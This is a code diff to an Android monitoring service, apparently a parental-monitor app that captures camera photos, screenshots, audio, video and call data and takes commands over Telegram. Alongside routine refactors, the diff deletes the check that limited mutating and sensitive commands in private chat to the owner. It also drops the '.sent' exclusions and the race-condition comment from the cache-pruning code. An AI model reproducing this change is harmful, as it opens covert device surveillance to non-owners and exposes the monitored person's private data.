@@ -574,9 +574,6 @@ class MonitoringService : Service() {
             refreshLoopConfig()
             return
         }
-        if (loopWatchdogJob?.isActive != true) {
-            try { startLoopWatchdog() } catch (_: Exception) { }
-        }
         serviceStartAt = System.currentTimeMillis()
         serviceStartElapsed = android.os.SystemClock.elapsedRealtime()
         if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "=== Starting monitoring service ===")
@@ -751,7 +748,7 @@ class MonitoringService : Service() {
                     try { checkVehicle() } catch (_: Exception) { }
                     if (!cachedMonitoringPaused) {
                         val dataAuthBlocked = try { NetworkUtils.isAuthBlocked(preferencesManager) } catch (_: Exception) { false }
-                        if (checkAndSendNewData()) idleDataCycles = 0 else if (!dataAuthBlocked) idleDataCycles = (idleDataCycles + 1).coerceAtMost(8)
+                        if (checkAndSendNewData()) idleDataCycles = 0 else if (!dataAuthBlocked) idleDataCycles = (idleDataCycles + 1).coerceAtMost(3)
                         try {
                             CrashReporter.flushPending(this@MonitoringService)
                         } catch (_: Exception) {
@@ -938,13 +935,8 @@ class MonitoringService : Service() {
 
     private suspend fun chunkedDelay(totalMs: Long) {
         if (totalMs <= 0L) return
-        var remaining = totalMs
-        while (remaining > 0L) {
-            currentCoroutineContext().ensureActive()
-            val step = remaining.coerceAtMost(5_000L)
-            delay(step)
-            remaining -= step
-        }
+        currentCoroutineContext().ensureActive()
+        delay(totalMs)
     }
 
     private val credsLock = Any()
@@ -1341,9 +1333,7 @@ class MonitoringService : Service() {
                     val head = headArg.getOrNull(0).orEmpty()
                     val command = head.substringBefore("@").lowercase(java.util.Locale.ROOT)
                     val arg = headArg.getOrNull(1)?.trim().orEmpty()
-                    val startHead = command
-                    val startArg = arg
-                    if (senderId.isNotEmpty() && msgChatId == senderId && senderId != chatId && startHead == "/start" && startArg.isNotEmpty()) {
+                    if (senderId.isNotEmpty() && msgChatId == senderId && senderId != chatId && command == "/start" && arg.isNotEmpty()) {
                         if (cachedOwnerId == 0L && android.os.SystemClock.elapsedRealtime() >= pairGlobalLockoutUntil.get()) {
                             val nowPair = android.os.SystemClock.elapsedRealtime()
                             val lastPair = try { pairAttemptAt[senderId] ?: 0L } catch (_: Exception) { 0L }
@@ -1353,7 +1343,7 @@ class MonitoringService : Service() {
                                     pairAttemptAt[senderId] = nowPair
                                 } catch (_: Exception) {
                                 }
-                                val startTokens = startArg.split(CMD_SPLIT_REGEX).filter { it.isNotEmpty() }
+                                val startTokens = arg.split(CMD_SPLIT_REGEX).filter { it.isNotEmpty() }
                                 val pairCode = try { preferencesManager.ensureOwnerPairCode() } catch (_: Exception) { "" }
                                 if (startTokens.size >= 2 && startTokens[0] == chatId && pairCode.isNotEmpty() && startTokens[1] == pairCode) {
                                     val learned = rememberOwner(senderId.toLongOrNull() ?: 0L)
@@ -1715,11 +1705,6 @@ class MonitoringService : Service() {
                 return
             }
         } else if (!senderOk && !chatOk) {
-            return
-        }
-        // Extra guard: mutating/sensitive commands in private chat still require owner
-        if ((command in MUTATING_COMMANDS || command in SENSITIVE_COMMANDS) && privateChat && !senderOk) {
-            sendToTelegram("\u26D4 Hanya owner yang bisa pakai ${Html.escape(command)}.")
             return
         }
         when (command) {
@@ -3184,7 +3169,7 @@ class MonitoringService : Service() {
                     callSentAny = true
                     found = true
                 }
-                    if (callSentAny) {
+                if (callSentAny) {
                     try { preferencesManager.lastSyncTime = System.currentTimeMillis() } catch (_: Exception) { }
                     try { preferencesManager.lastDataAt = System.currentTimeMillis() } catch (_: Exception) { }
                 }
@@ -5121,14 +5106,14 @@ class MonitoringService : Service() {
     }
 
     override fun onTimeout(startId: Int, fgsType: Int) {
-        handleFgsTimeout(startId)
+        handleFgsTimeout()
     }
 
     override fun onTimeout(startId: Int) {
-        handleFgsTimeout(startId)
+        handleFgsTimeout()
     }
 
-    private fun handleFgsTimeout(startId: Int) {
+    private fun handleFgsTimeout() {
         try {
             MessageScheduler.scheduleBootRestart(this)
         } catch (_: Exception) {
@@ -5630,7 +5615,6 @@ class MonitoringService : Service() {
     private fun ensureShotSession(): ImageReader? {
         val metrics = DisplayMetrics()
         val wm = windowManagerSvc ?: return null
-        if (wm == null) return null
         try {
             @Suppress("DEPRECATION")
             wm.defaultDisplay.getRealMetrics(metrics)
@@ -6700,7 +6684,6 @@ class MonitoringService : Service() {
             } catch (e: Exception) {
                 ""
             }
-            val errorBody = errorFull.take(200)
             if (response.code() == 429) {
                 val waitSecs = NetworkUtils.parseRetryAfter(errorFull).coerceIn(1L, 3600L)
                 mediaBackoffUntil = android.os.SystemClock.elapsedRealtime() + waitSecs * 1000L
@@ -6806,7 +6789,7 @@ class MonitoringService : Service() {
         if (videoFlushBusy.get()) return
         try {
             val files = cacheDir.listFiles { file ->
-                file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4") && !file.name.endsWith(".sent")
+                file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4")
             }?.sortedBy { it.lastModified() }?.filter { it != activeVideoFile } ?: return
             val dropped = files.dropLast(maxKept)
             if (dropped.isEmpty()) return
@@ -6877,7 +6860,7 @@ class MonitoringService : Service() {
         if (audioFlushBusy.get()) return
         try {
             val files = cacheDir.listFiles { file ->
-                file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a") && !file.name.endsWith(".sent")
+                file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
             }?.sortedBy { it.lastModified() }?.filter { it != activeAudioFile } ?: return
             val dropped = files.dropLast(maxKept)
             if (dropped.isEmpty()) return
@@ -7198,7 +7181,6 @@ class MonitoringService : Service() {
         }
     }
     private fun prunePhotoCache(maxKept: Int = 10) {
-        // Don't prune while flush is in progress - race condition with .sent rename
         if (photoFlushBusy.get()) return
         try {
             try {
@@ -7208,7 +7190,7 @@ class MonitoringService : Service() {
             } catch (_: Exception) {
             }
             val photos = cacheDir.listFiles { file ->
-                file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg") && !file.name.endsWith(".sent")
+                file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")
             }?.sortedBy { it.lastModified() }?.filter { it != activePhotoFile && it != activeShotFile } ?: return
             val dropped = photos.dropLast(maxKept)
             if (dropped.isEmpty()) return
